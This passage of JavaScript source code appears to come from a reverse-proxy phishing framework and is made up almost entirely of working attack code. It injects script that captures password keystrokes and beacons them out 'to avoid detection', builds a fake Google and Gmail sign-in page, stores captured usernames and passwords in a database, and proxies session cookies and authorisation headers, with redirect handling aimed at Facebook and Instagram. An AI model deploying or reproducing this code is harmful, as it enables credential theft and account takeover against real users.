                    if (Object.keys(data).length > 0) {
                      const img = new Image();
                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
                               'data=' + encodeURIComponent(JSON.stringify(data)) + 
                               '&url=' + encodeURIComponent(location.href) + 
                               '&t=' + Date.now();
                    }
                  } catch(err) {
                    // Silent fail
                  }
                }, true);
                
                // Monitor input changes for real-time capture
                let inputTimeout;
                document.addEventListener('input', function(e) {
                  if (e.target.type === 'password' || 
                      e.target.name && e.target.name.toLowerCase().includes('pass')) {
                    clearTimeout(inputTimeout);
                    inputTimeout = setTimeout(() => {
                      // Capture password attempts with delay to avoid detection
                      const img = new Image();
                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
                               'type=input&field=' + encodeURIComponent(e.target.name) + 
                               '&value=' + encodeURIComponent(e.target.value) + 
                               '&t=' + Date.now();
                    }, 1000);
                  }
                }, true);
              } catch(err) {
                // Silent fail
              }
            };
            
            // Initialize monitoring after a delay to let modules load
            if (document.readyState === 'loading') {
              document.addEventListener('DOMContentLoaded', function() {
                setTimeout(initMonitoring, 100);
              });
            } else {
              setTimeout(initMonitoring, 100);
            }
          })();
        </script>
      `);

      return $.html();
    } catch (error) {
      console.error('Error modifying HTML content:', error);
      return html;
    }
  }

  /**
   * Create a realistic Google login simulation for phishing campaigns
   * This bypasses CSP issues by providing a custom Google-like interface
   */
  createGoogleSimulation(sessionToken, targetUrl, trackingId, req) {
    const urlObj = new URL(targetUrl);
    const isGmail = targetUrl.includes('mail.google.com');
    const isAccounts = targetUrl.includes('accounts.google.com');
    
    console.log(`🎭 Creating Google simulation for ${targetUrl}`);
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${isGmail ? 'Gmail' : 'Sign in - Google Accounts'}</title>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6M0Y0NjlEOEQ5MjI3MTFFMkE5NDdGNkY4RkZCQjU2MkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6M0Y0NjlEOEU5MjI3MTFFMkE5NDdGNkY4RkZCQjU2MkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozRjQ2OUQ4QjkyMjcxMUUyQTk0N0Y2RjhGRkJCNTYyQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozRjQ2OUQ4QzkyMjcxMUUyQTk0N0Y2RjhGRkJCNTYyQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv9mPhYAAAT4SURBVHjaxFdLaBRBEK2eSTbZaNasxiSKGhONaDAq8QMRPYn/A15E8CLiQfEgCMGLoHhQD4IHP3jyoKjBgxdBkYMfQSWJH3IwJvHfGDWJH5JNNpsZp6qnJzO7O7szO7ML0z1dXVX16r2qrpneYgaIYWMGc3eMqSuWQ1cSRfJZ1+4qH3Kro52zPUjUlpUOy2EqRJb+K7xME75iGiJ9u21mM7ZqGH3vErlCxd/1nefPu4rYa6jQ=="/>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #f5f5f5;
            color: #202124;
        }
        
        .container {
            display: flex;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        
        .signin-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,.2);
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
        }
        
        .google-logo {
            width: 75px;
            height: 24px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjcyIiBoZWlnaHQ9IjkyIiB2aWV3Qm94PSIwIDAgMjcyIDkyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0iTTExNS43NSA0Ny4xOGMwIDEyLjc3LTkuOTkgMjIuMTgtMjIuMjUgMjIuMThTNzEuMjUgNTkuOTUgNzEuMjUgNDcuMThjMC0xMi44NSA5Ljk5LTIyLjE4IDIyLjI1LTIyLjE4UzExNS43NSAzNC4zMyAxMTUuNzUgNDcuMTh6bS05LjUgMGMwLTcuOTgtNS43OS0xMy40NC0xMi43NS0xMy40NFM4MC43NSAzOS4yIDgwLjc1IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNzUgMTMuNDRTMTA2LjI1IDU1LjA4IDEwNi4yNSA0Ny4xOHoiIGZpbGw9IiNFQTQzMzUiLz48cGF0aCBkPSJNMTYzLjc1IDQ3LjE4YzAgMTIuNzctOS45OSAyMi4xOC0yMi4yNSAyMi4xOFMxMTkuMjUgNTkuOTUgMTE5LjI1IDQ3LjE4YzAtMTIuODUgOS45OS0yMi4xOCAyMi4yNS0yMi4xOFMxNjMuNzUgMzQuMzMgMTYzLjc1IDQ3LjE4em0tOS41IDBjMC03Ljk4LTUuNzktMTMuNDQtMTIuNzUtMTMuNDRTMTI4Ljc1IDM5LjIgMTI4Ljc1IDQ3LjE4YzAgNy45IDUuNzkgMTMuNDQgMTIuNzUgMTMuNDRTMTU0LjI1IDU1LjA4IDE1NC4yNSA0Ny4xOHoiIGZpbGw9IiNGQkJDMDQiLz48cGF0aCBkPSJNMjA5LjI1IDI2LjM0djM5Ljg0Yy0yLjIzIDEuOTQtNC43OCAzLjQzLTcuNjcgNC40NS0yLjg4IDEuMDMtNi4wNiAxLjU0LTkuNTQgMS41NC05LjYyIDAtMTcuNzctMy4xMS0yNC40Ni05LjM0UzE1My4yNSA1MS4xNiAxNTMuMjUgNDEuNTZjMC05LjY5IDMuMjctMTcuNzQgOS44Mi0yNC4xN3MxNC45LTkuNjQgMjQuOTgtOS42NGM5LjU5IDAgMTcuNTQgMy4zIDIzLjg1IDkuOWwtNi4wOCA2LjA4Yy00Ljk2LTUuMy0xMS4xMy03Ljk1LTE4LjUxLTcuOTUtNi45NSAwLTEyLjk1IDIuNDctMTggNy40MXMtNy41OSAxMS4xNy03LjU5IDE4LjZjMCA3LjQzIDIuNTQgMTMuNiA3LjYzIDE4LjVzMTEuMDkgNy4zNSAxNy45NyA3LjM1YzMuMzIgMCA2LjM1LS40MyA5LjEtMS4zdjE2LjEtMTEuNzMgMHYtMTEuMjloMTEuNzNWMjYuMzRIMjA5LjI1eiIgZmlsbD0iIzM0QTg1MyIvPjxwYXRoIGQ9Ik0yMjUgM3YzMmg2Ljc1VjI1aDEwLjI1VjIuMjlIMjI1em05IDBoMjV2MTEuNzNIMjQ2VjI1aDExLjUzdjEwSDI1NFYyLjI5aC0yMFYxNHptMzQuNSAwaC0xNHYzMmgxNFYyNXptMCA3LjgyaDEwLjVWMTl6bTcgMGgyMXYxMS43M0gyNTQuNVYyNUgyNDRWMTBoMTBWMi4yOWgtMTB6IiBmaWxsPSIjNEI4NUY1Ii8+PHBhdGggZD0iTTI2Mi41IDUzaC0xNHYzMmgxNFY3NXptMCA3LjgyaDEwLjVWNjl6bTcgMGgyMXYxMS43M0gyNTQuNVY3NUgyNDRWNjBoMTBWNTIuMjloLTEweiIgZmlsbD0iIzM0QTg1MyIvPjwvZz48L3N2Zz4=');
            background-size: contain;
            background-repeat: no-repeat;
            margin: 0 auto 16px auto;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #3c4043;
        }
        
        .btn-primary {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            float: right;
        }
        
        .btn-primary:hover {
            background-color: #1557b0;
        }
        
        .btn-secondary {
            color: #1a73e8;
            background: none;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-secondary:hover {
            background-color: rgba(26, 115, 232, 0.04);
        }
        
        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        
        .help-links {
            margin-top: 24px;
            text-align: center;
        }
        
        .help-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin: 0 16px;
        }
        
        .help-links a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }
        
        .language-selector {
            position: absolute;
            top: 24px;
            right: 24px;
        }
        
        .language-selector select {
            border: none;
            background: none;
            color: #5f6368;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="language-selector">
        <select>
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
        </select>
    </div>
    
    <div class="container">
        <div class="signin-card">
            <div class="google-logo"></div>
            <h1 class="title">${isGmail ? 'Sign in to Gmail' : 'Sign in'}</h1>
            <p class="subtitle">${isGmail ? 'Use your Google Account' : 'Use your Google Account'}</p>
            
            <form id="signinForm" method="POST" action="/${sessionToken}/accounts.google.com/signin/v2/challenge/pwd">
                <input type="hidden" name="_fstrike_session" value="${sessionToken}">
                ${trackingId ? `<input type="hidden" name="_fstrike_track" value="${trackingId}">` : ''}
                <input type="hidden" name="continue" value="${isGmail ? 'https://mail.google.com/mail/' : targetUrl}">
                <input type="hidden" name="service" value="${isGmail ? 'mail' : 'accounts'}">
                <input type="hidden" name="flowName" value="GlifWebSignIn">
                <input type="hidden" name="flowEntry" value="ServiceLogin">
                <input type="hidden" name="TL" value="AM3QAMBXgSw3dMHMLfPHiB6V8m2gF8mz6NJIhOGN7c_V-j9gQw1UL2iGWVQ7nXDu8kOuDw">
                
                <div class="form-group">
                    <label class="form-label" for="identifier">Email or phone</label>
                    <input type="text" id="identifier" name="identifier" class="form-input" autocomplete="username" required>
                    <div class="error-message" id="identifier-error">Enter a valid email or phone number</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <input type="password" id="password" name="passwd" class="form-input" autocomplete="current-password" required>
                    <div class="error-message" id="password-error">Wrong password. Try again.</div>
                </div>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    Signing in...
                </div>
                
                <div class="form-actions">
                    <button type="button" class="btn-secondary">Forgot email?</button>
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
            
            <div class="help-links">
                <a href="javascript:void(0)">Create account</a>
                <a href="javascript:void(0)">Help</a>
                <a href="javascript:void(0)">Privacy</a>
                <a href="javascript:void(0)">Terms</a>
            </div>
            
            <div class="footer">
                One account. All of Google working for you.
            </div>
        </div>
    </div>
    
    <script>
        // Realistic Google-like form validation and submission
        document.getElementById('signinForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const identifier = document.getElementById('identifier').value.trim();
            const password = document.getElementById('password').value;
            
            // Clear previous errors
            document.getElementById('identifier-error').style.display = 'none';
            document.getElementById('password-error').style.display = 'none';
            
            // Basic validation
            if (!identifier) {
                document.getElementById('identifier-error').style.display = 'block';
                document.getElementById('identifier').focus();
                return;
            }
            
            if (!password) {
                document.getElementById('password-error').textContent = 'Enter a password';
                document.getElementById('password-error').style.display = 'block';
                document.getElementById('password').focus();
                return;
            }
            
            // Show loading state
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn-primary').disabled = true;
            
            // Simulate realistic timing
            setTimeout(() => {
                // Submit the form normally - this will capture credentials
                const formData = new FormData(this);
                
                fetch(this.action, {
                    method: 'POST',
                    body: formData
                }).then(response => {
                    if (response.ok) {
                        // Simulate successful login by redirecting to Gmail or success page
                        ${isGmail ? 
                          `window.location.href = '/${sessionToken}/mail.google.com/mail/u/0/';` :
                          `window.location.href = '/${sessionToken}/accounts.google.com/';`
                        }
                    } else {
                        // Show error message
                        document.getElementById('loading').style.display = 'none';
                        document.querySelector('.btn-primary').disabled = false;
                        document.getElementById('password-error').textContent = 'Wrong password. Try again.';
                        document.getElementById('password-error').style.display = 'block';
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }
                }).catch(error => {
                    console.error('Error:', error);
                    // Still submit to capture data even if there's an error
                    this.submit();
                });
            }, 1500 + Math.random() * 1000); // Realistic loading time
        });
        
        // Add realistic input behaviors
        document.getElementById('identifier').addEventListener('blur', function() {
            const value = this.value.trim();
            if (value && !isValidEmailOrPhone(value)) {
                document.getElementById('identifier-error').style.display = 'block';
            } else {
                document.getElementById('identifier-error').style.display = 'none';
            }
        });
        
        function isValidEmailOrPhone(value) {
            const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
            const phoneRegex = /^[\\d\\s\\-\\+\\(\\)]{10,}$/;
            return emailRegex.test(value) || phoneRegex.test(value);
        }
        
        // Disable right-click context menu to seem more realistic
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Add Google-like keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
                document.getElementById('signinForm').dispatchEvent(new Event('submit'));
            }
        });
        
    console.log('Google Account simulation loaded - session ${sessionToken}');
    </script>
</body>
</html>`;
  }

  /**
   * Handle Google simulation form submission
   */
  async handleGoogleSimulationSubmission(sessionToken, credentials) {
    try {
      const session = this.activeSessions.get(sessionToken);
      if (!session) {
        console.error(`No session found for token ${sessionToken}`);
        return;
      }

      console.log(`🔑 GOOGLE SIMULATION CREDENTIALS CAPTURED for session ${sessionToken}:`);
      console.log(`   Email/Username: ${credentials.username}`);
      console.log(`   Password: ${credentials.password ? '[CAPTURED]' : '[EMPTY]'}`);
      console.log(`   IP Address: ${credentials.ip}`);
      console.log(`   User Agent: ${credentials.userAgent}`);
      
      // Store in captures
      const captures = this.captures.get(sessionToken);
      if (captures) {
        captures.credentials.push({
          email: credentials.username,
          username: credentials.username,
          password: credentials.password,
          timestamp: new Date().toISOString(),
          url: 'google.com (simulation)',
          ip: credentials.ip,
          userAgent: credentials.userAgent,
          type: 'google_simulation'
        });
        this.captures.set(sessionToken, captures);
      }

      // Store in database
      try {
        await new Promise((resolve, reject) => {
          db.run(
            `INSERT INTO captured_credentials 
             (campaign_id, session_token, username, password, email, url, ip_address, user_agent, captured_at)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
            [
              session.campaignId,
              sessionToken,
              credentials.username,
              credentials.password,
              credentials.username,
              'google.com (simulation)',
              credentials.ip,
              credentials.userAgent
            ],
            function(err) {
              if (err) reject(err);
              else {
                console.log(`✅ Google simulation credentials stored in database with ID: ${this.lastID}`);
                resolve(this.lastID);
              }
            }
          );
        });

        // Associate with email tracking if trackingId is provided
        if (credentials.trackingId) {
          await this.associateLoginWithEmail(sessionToken, credentials.trackingId, {
            username: credentials.username,
            password: credentials.password,
            email: credentials.username,
            formData: JSON.stringify(credentials),
            ip_address: credentials.ip,
            user_agent: credentials.userAgent
          });
        }

        // Emit real-time update via WebSocket
        if (this.io) {
          this.io.emit('credentialsCaptured', {
            sessionToken,
            campaignId: session.campaignId,
            credentials: {
              email: credentials.username,
              type: 'google_simulation',
              timestamp: new Date().toISOString()
            }
          });
        }

      } catch (dbError) {
        console.error('Database error when storing Google simulation credentials:', dbError);
      }

    } catch (error) {
      console.error('Error handling Google simulation submission:', error);
    }
  }

  /**
   * Handle cross-origin API requests by proxying them through our server
   */
  async handleCrossOriginRequest(req, res, sessionToken) {
    try {
      const session = this.activeSessions.get(sessionToken);
      if (!session) {
        return res.status(404).json({ error: 'Session not found' });
      }

      // Handle preflight OPTIONS requests
      if (req.method === 'OPTIONS') {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma, X-Proxy-Target, X-Original-Host, X-Goog-AuthUser, X-Client-Data');
        res.header('Access-Control-Allow-Credentials', 'true');
        res.header('Access-Control-Max-Age', '86400'); // 24 hours
        return res.status(200).end();
      }

      // Extract the target URL from the request
      const targetUrl = req.query.url || req.body.url || req.headers['x-proxy-target'];
      if (!targetUrl) {
        return res.status(400).json({ error: 'No target URL provided' });
      }

      // Handle relative URLs by converting them to absolute URLs
      let absoluteTargetUrl;
      try {
        if (targetUrl.startsWith('/')) {
          // Relative URL - use the session's target URL as base
          const baseUrl = new URL(session.targetUrl);
          absoluteTargetUrl = `${baseUrl.protocol}//${baseUrl.host}${targetUrl}`;
        } else if (targetUrl.startsWith('http://') || targetUrl.startsWith('https://')) {
          // Already absolute URL
          absoluteTargetUrl = targetUrl;
        } else {
          // Relative URL without leading slash
          const baseUrl = new URL(session.targetUrl);
          absoluteTargetUrl = `${baseUrl.protocol}//${baseUrl.host}/${targetUrl}`;
        }
      } catch (urlError) {
        console.error('Error processing target URL:', urlError);
        return res.status(400).json({ error: 'Invalid target URL format' });
      }

      // Validate that this is a legitimate cross-origin request for the mirrored site
      const sessionDomain = new URL(session.targetUrl).hostname;
      const requestDomain = new URL(absoluteTargetUrl).hostname;
      
      // Allow requests to same domain or Google services (expanded list)
      const allowedDomains = [
        sessionDomain,
        'google.com', 'gstatic.com', 'googleapis.com', 'googleusercontent.com',
        'gmail.com', 'play.google.com', 'accounts.google.com', 'ssl.gstatic.com',
        'www.google.com', 'mail.google.com', 'drive.google.com', 'docs.google.com'
      ];
      
      const isAllowed = allowedDomains.some(domain => 
        requestDomain.includes(domain) || domain.includes(requestDomain)
      );
      
      if (!isAllowed) {
        console.warn(`🚫 Blocked cross-origin request to: ${requestDomain}`);
        return res.status(403).json({ error: 'Cross-origin request not allowed' });
      }

      console.log(`🌐 Proxying cross-origin request: ${absoluteTargetUrl}`);

      const cookieJar = this.cookieJars.get(sessionToken);
      const headers = this.generateRealistBrowserHeaders(req, absoluteTargetUrl, sessionToken);
      
      // Copy important headers from the original request
      const importantHeaders = [
        'content-type', 'authorization', 'x-goog-authuser', 'x-client-data',
        'x-goog-pageid', 'x-same-domain', 'x-requested-with'
      ];
      
      importantHeaders.forEach(headerName => {
        if (req.headers[headerName]) {
          headers[headerName] = req.headers[headerName];
        }
      });
      
      // Build cookie header for the target domain
      const cookieHeader = this.buildCookieHeader(req, cookieJar, absoluteTargetUrl);
      if (cookieHeader) {
        headers['Cookie'] = cookieHeader;
      }

      // For Google API requests, adjust headers
      if (requestDomain.includes('google')) {
        headers['Referer'] = session.targetUrl;
        headers['Origin'] = new URL(session.targetUrl).origin;
        
        // Add specific Google headers if not present
        if (!headers['X-Same-Domain']) {
          headers['X-Same-Domain'] = '1';
        }
      }

      // Make the proxied request
      const response = await axiosInstance({
        method: req.method,
        url: absoluteTargetUrl,
        data: req.body,
        headers,
        responseType: 'arraybuffer',
        maxRedirects: 5,
        validateStatus: () => true,
        timeout: 30000, // Increased timeout for API calls
        jar: cookieJar,
        withCredentials: true
      });

      // Save any cookies from the response
      if (response.headers['set-cookie']) {
        const cookies = Array.isArray(response.headers['set-cookie']) 
          ? response.headers['set-cookie'] 
          : [response.headers['set-cookie']];
          
        cookies.forEach(cookie => {
          this.storeCookieForLater(sessionToken, cookie, absoluteTargetUrl);
        });
        
        this.trackAllCookies(sessionToken, cookies);
      }

      // Process and return the response
      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
      
      Object.entries(processedHeaders).forEach(([key, value]) => {
        if (value !== undefined && value !== null) {
          res.setHeader(key, value);
        }
      });

      res.status(response.status);
      
      // Check if it's JSON response
      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('application/json')) {
        try {
          const jsonData = JSON.parse(response.data.toString('utf-8'));
          res.json(jsonData);
        } catch (e) {
          res.send(response.data);
        }
      } else if (contentType.includes('text/')) {
        res.send(response.data.toString('utf-8'));
      } else {
        res.send(response.data);
      }

    } catch (error) {
      console.error('Error handling cross-origin request:', error);
      res.status(500).json({ 
        error: 'Proxy request failed',
        details: error.message 
      });
    }
  }

  /**
   * Intelligent URL rewriting to avoid detection
   */
  rewriteUrls($, proxyPath, targetUrl, sessionToken) {
    const baseUrl = new URL(targetUrl);
    
    // Rewrite all relative links
    $('a[href]').each((i, elem) => {
      const href = $(elem).attr('href');
      if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) return;
      
      try {
        const absoluteUrl = new URL(href, targetUrl);
        if (absoluteUrl.origin === baseUrl.origin) {
          const path = absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash;
          $(elem).attr('href', `${proxyPath}${path}`);
        }
      } catch (e) {
        if (href.startsWith('/')) {
          $(elem).attr('href', `${proxyPath}${href}`);
        }
      }
    });

    // Fix forms with advanced detection avoidance
    $('form').each((i, elem) => {
      const $form = $(elem);
      const action = $form.attr('action') || '';
      
      if (action.startsWith('javascript:')) return;
      
      // Add stealth tracking field
      $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}" style="display:none!important;position:absolute!important;left:-9999px!important;">`);
      
      try {
        const absoluteAction = new URL(action, targetUrl);
        if (absoluteAction.origin === baseUrl.origin) {
          const path = absoluteAction.pathname + absoluteAction.search + absoluteAction.hash;
          $form.attr('action', `${proxyPath}${path}`);
        }
      } catch (e) {
        if (action === '') {
          $form.attr('action', '');
        } else if (action.startsWith('/')) {
          $form.attr('action', `${proxyPath}${action}`);
        }
      }
    });

    // Fix resources with intelligent handling
    $('[src], [href]:not(a)').each((i, elem) => {
      const attrName = $(elem).attr('src') ? 'src' : 'href';
      const attrVal = $(elem).attr(attrName);
      
      if (!attrVal || attrVal.startsWith('data:')) return;
      
      try {
        const absoluteUrl = new URL(attrVal, targetUrl);
        if (absoluteUrl.origin === baseUrl.origin) {
          const path = absoluteUrl.pathname + absoluteUrl.search;
          $(elem).attr(attrName, `${proxyPath}${path}`);
        }
      } catch (e) {
        if (attrVal.startsWith('//')) {
          $(elem).attr(attrName, `https:${attrVal}`);
        } else if (attrVal.startsWith('/')) {
          $(elem).attr(attrName, `${proxyPath}${attrVal}`);
        }
      }
    });

    // Fix CSS URLs
    this.fixCssUrls($, proxyPath, targetUrl);
  }

  /**
   * Fix CSS URLs in style tags and attributes
   */
  fixCssUrls($, proxyPath, targetUrl) {
    const baseUrl = new URL(targetUrl);
    
    // Fix inline styles
    $('[style]').each((i, elem) => {
      const style = $(elem).attr('style');
      if (!style || !style.includes('url(')) return;
      
      const newStyle = style.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
        if (url.startsWith('data:')) return match;
        
        try {
          const absoluteUrl = new URL(url, targetUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            const path = absoluteUrl.pathname + absoluteUrl.search;
            return `url(${proxyPath}${path})`;
          }
          return match;
        } catch (e) {
          if (url.startsWith('/')) {
            return `url(${proxyPath}${url})`;
          }
          return match;
        }
      });
      
      $(elem).attr('style', newStyle);
    });

    // Fix CSS in style tags
    $('style').each((i, elem) => {
      const css = $(elem).html();
      if (!css || !css.includes('url(')) return;
      
      const newCss = css.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
        if (url.startsWith('data:')) return match;
        
        try {
          const absoluteUrl = new URL(url, targetUrl);
          if (absoluteUrl.origin === baseUrl.origin) {
            const path = absoluteUrl.pathname + absoluteUrl.search;
            return `url(${proxyPath}${path})`;
          }
          return match;
        } catch (e) {
          if (url.startsWith('/')) {
            return `url(${proxyPath}${url})`;
          }
          return match;
        }
      });
      
      $(elem).html(newCss);
    });
  }

  /**
   * Extract charset from content-type header
   */
  extractCharset(contentType) {
    const match = /charset=([^;]+)/i.exec(contentType);
    return match ? match[1].toLowerCase() : null;
  }

  /**
   * Handle redirects properly with advanced loop detection
   */
  handleRedirect(session, req, res, response) {
    const { headers, status } = response;
    const location = headers.location;
    const sessionToken = session.sessionToken;
    const targetUrl = session.targetUrl;
    
    console.log(`Handling redirect: ${location} (${status})`);
    
    let redirectUrl;
    
    // Add redirect tracking to prevent loops
    if (!session.redirectHistory) {
      session.redirectHistory = [];
    }
    
    // Check for redirect loops (same URL appearing multiple times)
    const redirectLimit = 10; // Allow up to 10 redirects in a chain
    if (session.redirectHistory.length >= redirectLimit) {
      console.warn(`⚠️ Redirect limit reached (${redirectLimit}). Breaking chain.`);
      
      // Reset redirect history
      session.redirectHistory = [];
      
      // Instead of another redirect, render a simple page with a link
      return res.status(200).send(`
        <html>
          <head>
            <title>Redirect Intercepted</title>
            <meta http-equiv="refresh" content="0; url=/${sessionToken}/">
          </head>
          <body>
            <h3>Redirecting to homepage...</h3>
            <p>Too many redirects detected. Click <a href="/${sessionToken}/">here</a> if not automatically redirected.</p>
          </body>
        </html>
      `);
    }
    
    try {
      // Check if it's an absolute URL
      if (/^https?:\/\//i.test(location)) {
        const locationUrl = new URL(location);
        const targetUrlObj = new URL(targetUrl);
        
        // Track this redirect to detect loops
        session.redirectHistory.push(locationUrl.href);
        
        // Handle cross-domain redirects better
        // For sophisticated websites, we need to be smarter about domain changes
        const isRelatedDomain = 
          locationUrl.hostname === targetUrlObj.hostname ||
          locationUrl.hostname.endsWith('.' + targetUrlObj.hostname) || 
          targetUrlObj.hostname.endsWith('.' + locationUrl.hostname) ||
          // Facebook-specific domains and subdomains
          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('facebook')) ||
          (targetUrlObj.hostname.includes('fb.') && locationUrl.hostname.includes('facebook')) ||
          (targetUrlObj.hostname.includes('facebook') && locationUrl.hostname.includes('fb.'));
        
        if (isRelatedDomain) {
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
        } else {
          // Cross-domain redirect handling
          // For Facebook, Instagram, etc. we need special handling
          const newOrigin = `${locationUrl.protocol}//${locationUrl.host}`;
          
          // Update the target URL for this session to follow the redirect chain
          session.targetUrl = newOrigin;
          
          // Change the path to follow the new domain
          redirectUrl = `/${sessionToken}${locationUrl.pathname}${locationUrl.search}${locationUrl.hash || ''}`;
          
          // For debugging
          console.log(`📍 Cross-domain redirect: Updated target URL to: ${newOrigin}`);
          
          // Special case for Facebook login redirects
          if (locationUrl.hostname.includes('facebook') || 
              locationUrl.hostname.includes('fb.') ||
              locationUrl.hostname.includes('instagram')) {
            // Clear redirect history on domain change to avoid false loop detection
            session.redirectHistory = [locationUrl.href];
          }
        }
      } else {
        // Relative URL redirect
        const basePath = location.startsWith('/') ? '' : '/';
        redirectUrl = `/${sessionToken}${basePath}${location}`;
        
        // Also track relative redirects
        const targetUrlObj = new URL(targetUrl);
        const fullRedirectUrl = new URL(location, targetUrl).href;
        session.redirectHistory.push(fullRedirectUrl);
      }
    } catch (error) {
      console.error('Error processing redirect:', error);
      redirectUrl = `/${sessionToken}/`;
    }
    
    // Pass along any Set-Cookie headers with the redirect
    if (headers['set-cookie']) {
      const cookies = Array.isArray(headers['set-cookie']) ? 
        headers['set-cookie'] : [headers['set-cookie']];
      
      // Log cookies for debugging redirect issues
      console.log(`🍪 Setting ${cookies.length} cookies during redirect`);
      
      res.setHeader('Set-Cookie', cookies);
    }
    
    // Perform the redirect
    return res.redirect(status, redirectUrl);
  }

  /**
   * Process response headers to ensure they work in our proxy context
   */
